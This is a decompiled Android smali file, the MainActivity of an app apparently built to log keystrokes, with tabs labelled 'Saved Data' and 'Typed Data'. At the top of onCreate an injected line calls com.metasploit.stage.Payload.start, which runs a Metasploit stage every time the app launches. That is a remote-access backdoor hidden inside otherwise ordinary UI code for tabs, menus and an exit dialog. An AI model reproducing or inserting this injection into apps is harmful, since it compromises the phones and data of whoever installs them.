.class public Lhack/hackit/pankaj/keyboardlisten/MainActivity;
.super Landroid/support/v7/app/ActionBarActivity;
.source "MainActivity.java"

# interfaces
.implements Landroid/support/v7/app/ActionBar$TabListener;


# static fields
.field protected static context:Landroid/content/Context;


# instance fields
.field private actionBar:Landroid/support/v7/app/ActionBar;

.field private items:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private mAdapter:Lhack/hackit/pankaj/keyboardlisten/TabsPagerAdapter;

.field private viewPager:Landroid/support/v4/view/ViewPager;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 20
    invoke-direct {p0}, Landroid/support/v7/app/ActionBarActivity;-><init>()V

    return-void
.end method

.method private AskOption()Landroid/support/v7/app/AlertDialog;
    .locals 4

    .prologue
    .line 176
    new-instance v1, Landroid/support/v7/app/AlertDialog$Builder;

    const v2, 0x7f0d0085

    invoke-direct {v1, p0, v2}, Landroid/support/v7/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    const-string v2, "Exit"

    .line 178
    invoke-virtual {v1, v2}, Landroid/support/v7/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "Do you want to Exit"

    .line 179
    invoke-virtual {v1, v2}, Landroid/support/v7/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "Yes"

    new-instance v3, Lhack/hackit/pankaj/keyboardlisten/MainActivity$3;

    invoke-direct {v3, p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity$3;-><init>(Lhack/hackit/pankaj/keyboardlisten/MainActivity;)V

    .line 181
    invoke-virtual {v1, v2, v3}, Landroid/support/v7/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "No"

    new-instance v3, Lhack/hackit/pankaj/keyboardlisten/MainActivity$2;

    invoke-direct {v3, p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity$2;-><init>(Lhack/hackit/pankaj/keyboardlisten/MainActivity;)V

    .line 193
    invoke-virtual {v1, v2, v3}, Landroid/support/v7/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/app/AlertDialog$Builder;

    move-result-object v1

    .line 200
    invoke-virtual {v1}, Landroid/support/v7/app/AlertDialog$Builder;->create()Landroid/support/v7/app/AlertDialog;

    move-result-object v0

    .line 201
    .local v0, "myQuittingDialogBox":Landroid/support/v7/app/AlertDialog;
    return-object v0
.end method

.method static synthetic access$000(Lhack/hackit/pankaj/keyboardlisten/MainActivity;)Landroid/support/v7/app/ActionBar;
    .locals 1
    .param p0, "x0"    # Lhack/hackit/pankaj/keyboardlisten/MainActivity;

    .prologue
    .line 20
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->actionBar:Landroid/support/v7/app/ActionBar;

    return-object v0
.end method

.method private openHelp()V
    .locals 2

    .prologue
    .line 115
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lhack/hackit/pankaj/keyboardlisten/Help;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 116
    .local v0, "intent":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 117
    return-void
.end method

.method private openSetting()V
    .locals 2

    .prologue
    .line 109
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lhack/hackit/pankaj/keyboardlisten/Settings;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 110
    .local v0, "intent":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 111
    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 1

    .prologue
    .line 170
    invoke-direct {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->AskOption()Landroid/support/v7/app/AlertDialog;

    move-result-object v0

    .line 171
    .local v0, "diaBox":Landroid/support/v7/app/AlertDialog;
    invoke-virtual {v0}, Landroid/support/v7/app/AlertDialog;->show()V

    .line 172
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .prologue
    .line 31
    sput-object p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->context:Landroid/content/Context;

    .line 32
    invoke-super {p0, p1}, Landroid/support/v7/app/ActionBarActivity;->onCreate(Landroid/os/Bundle;)V

    .line 33
    const v0, 0x7f030019

    invoke-virtual {p0, v0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->setContentView(I)V

    .line 35
    const v0, 0x7f0a004f

    invoke-virtual {p0, v0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/support/v4/view/ViewPager;

    iput-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->viewPager:Landroid/support/v4/view/ViewPager;

    .line 36
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->getSupportActionBar()Landroid/support/v7/app/ActionBar;

    move-result-object v0

    iput-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->actionBar:Landroid/support/v7/app/ActionBar;

    .line 37
    new-instance v0, Lhack/hackit/pankaj/keyboardlisten/TabsPagerAdapter;

    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v1

    invoke-direct {v0, v1}, Lhack/hackit/pankaj/keyboardlisten/TabsPagerAdapter;-><init>(Landroid/support/v4/app/FragmentManager;)V

    iput-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->mAdapter:Lhack/hackit/pankaj/keyboardlisten/TabsPagerAdapter;

    .line 39
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->viewPager:Landroid/support/v4/view/ViewPager;

    iget-object v1, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->mAdapter:Lhack/hackit/pankaj/keyboardlisten/TabsPagerAdapter;

    invoke-virtual {v0, v1}, Landroid/support/v4/view/ViewPager;->setAdapter(Landroid/support/v4/view/PagerAdapter;)V

    .line 40
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->actionBar:Landroid/support/v7/app/ActionBar;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/support/v7/app/ActionBar;->setHomeButtonEnabled(Z)V

    .line 41
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->actionBar:Landroid/support/v7/app/ActionBar;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/support/v7/app/ActionBar;->setNavigationMode(I)V

    .line 44
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->actionBar:Landroid/support/v7/app/ActionBar;

    iget-object v1, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->actionBar:Landroid/support/v7/app/ActionBar;

    invoke-virtual {v1}, Landroid/support/v7/app/ActionBar;->newTab()Landroid/support/v7/app/ActionBar$Tab;

    move-result-object v1

    const-string v2, "Saved Data"

    invoke-virtual {v1, v2}, Landroid/support/v7/app/ActionBar$Tab;->setText(Ljava/lang/CharSequence;)Landroid/support/v7/app/ActionBar$Tab;

    move-result-object v1

    .line 45
    invoke-virtual {v1, p0}, Landroid/support/v7/app/ActionBar$Tab;->setTabListener(Landroid/support/v7/app/ActionBar$TabListener;)Landroid/support/v7/app/ActionBar$Tab;

    move-result-object v1

    .line 44
    invoke-virtual {v0, v1}, Landroid/support/v7/app/ActionBar;->addTab(Landroid/support/v7/app/ActionBar$Tab;)V

    .line 46
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->actionBar:Landroid/support/v7/app/ActionBar;

    iget-object v1, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->actionBar:Landroid/support/v7/app/ActionBar;

    invoke-virtual {v1}, Landroid/support/v7/app/ActionBar;->newTab()Landroid/support/v7/app/ActionBar$Tab;

    move-result-object v1

    const-string v2, "Typed Data"

    invoke-virtual {v1, v2}, Landroid/support/v7/app/ActionBar$Tab;->setText(Ljava/lang/CharSequence;)Landroid/support/v7/app/ActionBar$Tab;

    move-result-object v1

    .line 47
    invoke-virtual {v1, p0}, Landroid/support/v7/app/ActionBar$Tab;->setTabListener(Landroid/support/v7/app/ActionBar$TabListener;)Landroid/support/v7/app/ActionBar$Tab;

    move-result-object v1

    .line 46
    invoke-virtual {v0, v1}, Landroid/support/v7/app/ActionBar;->addTab(Landroid/support/v7/app/ActionBar$Tab;)V

    .line 52
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->viewPager:Landroid/support/v4/view/ViewPager;

    new-instance v1, Lhack/hackit/pankaj/keyboardlisten/MainActivity$1;

    invoke-direct {v1, p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity$1;-><init>(Lhack/hackit/pankaj/keyboardlisten/MainActivity;)V

    invoke-virtual {v0, v1}, Landroid/support/v4/view/ViewPager;->setOnPageChangeListener(Landroid/support/v4/view/ViewPager$OnPageChangeListener;)V

    .line 70
    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 4
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    .line 124
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    .line 126
    .local v0, "inflater":Landroid/view/MenuInflater;
    const v3, 0x7f0e0001

    invoke-virtual {v0, v3, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 128
    const-string v3, "search"

    invoke-virtual {p0, v3}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/SearchManager;

    .line 129
    .local v1, "searchManager":Landroid/app/SearchManager;
    const v3, 0x7f0a0071

    invoke-interface {p1, v3}, Landroid/view/Menu;->findItem(I)Landroid/view/MenuItem;

    move-result-object v3

    invoke-interface {v3}, Landroid/view/MenuItem;->getActionView()Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/support/v7/widget/SearchView;

    .line 130
    .local v2, "searchView":Landroid/support/v7/widget/SearchView;
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v3

    invoke-virtual {v1, v3}, Landroid/app/SearchManager;->getSearchableInfo(Landroid/content/ComponentName;)Landroid/app/SearchableInfo;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/support/v7/widget/SearchView;->setSearchableInfo(Landroid/app/SearchableInfo;)V

    .line 131
    const/4 v3, 0x1

    return v3
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 2
    .param p1, "item"    # Landroid/view/MenuItem;

    .prologue
    const/4 v0, 0x1

    .line 137
    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v1

    packed-switch v1, :pswitch_data_0

    .line 148
    invoke-super {p0, p1}, Landroid/support/v7/app/ActionBarActivity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v0

    :goto_0
    return v0

    .line 139
    :pswitch_0
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->refreshList()V

    goto :goto_0

    .line 142
    :pswitch_1
    invoke-direct {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->openSetting()V

    goto :goto_0

    .line 145
    :pswitch_2
    invoke-direct {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->openHelp()V

    goto :goto_0

    .line 137
    nop

    :pswitch_data_0
    .packed-switch 0x7f0a0072
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method

.method public onTabReselected(Landroid/support/v7/app/ActionBar$Tab;Landroid/support/v4/app/FragmentTransaction;)V
    .locals 0
    .param p1, "tab"    # Landroid/support/v7/app/ActionBar$Tab;
    .param p2, "ft"    # Landroid/support/v4/app/FragmentTransaction;

    .prologue
    .line 154
    return-void
.end method

.method public onTabSelected(Landroid/support/v7/app/ActionBar$Tab;Landroid/support/v4/app/FragmentTransaction;)V
    .locals 2
    .param p1, "tab"    # Landroid/support/v7/app/ActionBar$Tab;
    .param p2, "ft"    # Landroid/support/v4/app/FragmentTransaction;

    .prologue
    .line 160
    iget-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->viewPager:Landroid/support/v4/view/ViewPager;

    invoke-virtual {p1}, Landroid/support/v7/app/ActionBar$Tab;->getPosition()I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/support/v4/view/ViewPager;->setCurrentItem(I)V

    .line 161
    return-void
.end method

.method public onTabUnselected(Landroid/support/v7/app/ActionBar$Tab;Landroid/support/v4/app/FragmentTransaction;)V
    .locals 0
    .param p1, "tab"    # Landroid/support/v7/app/ActionBar$Tab;
    .param p2, "ft"    # Landroid/support/v4/app/FragmentTransaction;

    .prologue
    .line 165
    return-void
.end method

.method public openFilter()V
    .locals 0

    .prologue
    .line 99
    return-void
.end method

.method public refreshList()V
    .locals 1

    .prologue
    .line 103
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->finish()V

    .line 104
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Lhack/hackit/pankaj/keyboardlisten/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 105
    return-void
.end method

.method public showMessage()V
    .locals 0

    .prologue
    .line 90
    return-void
.end method
